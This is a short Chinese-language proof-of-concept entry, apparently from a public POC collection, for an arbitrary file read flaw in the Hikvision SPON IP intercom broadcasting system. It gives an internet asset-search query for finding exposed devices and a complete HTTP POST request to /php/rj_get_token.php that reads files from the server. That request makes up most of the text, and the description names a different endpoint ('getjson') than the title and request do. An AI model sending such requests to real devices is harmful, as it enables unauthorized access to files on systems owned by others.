# 海康威视SPON IP网络对讲广播系统rj_get_token存在任意文件读取漏洞

# 一、漏洞简介
<font style="color:rgba(0, 0, 0, 0.9);">Hikvision Intercom Broadcasting System是中国海康威视（Hikvision）公司的一个对讲广播系统。海康威视SPON IP网络对讲广播系统getjson存在任意文件读取漏洞。</font>

# <font style="color:rgba(0, 0, 0, 0.9);">二、影响版本</font>
+ 海康威视SPON IP网络对讲广播系统

# 三、资产测绘
+ Hunter：`web.body="vendors/custom/html5.min.js"`
+ 特征


# 四、漏洞复现
```plain
POST /php/rj_get_token.php HTTP/1.1
Host: 
Content-Length: 120
Sec-Ch-Ua: 
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
Sec-Ch-Ua-Platform: ""
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

jsondata[url]=rj_get_token.php
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/sshgiyaupb6l0y7c>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
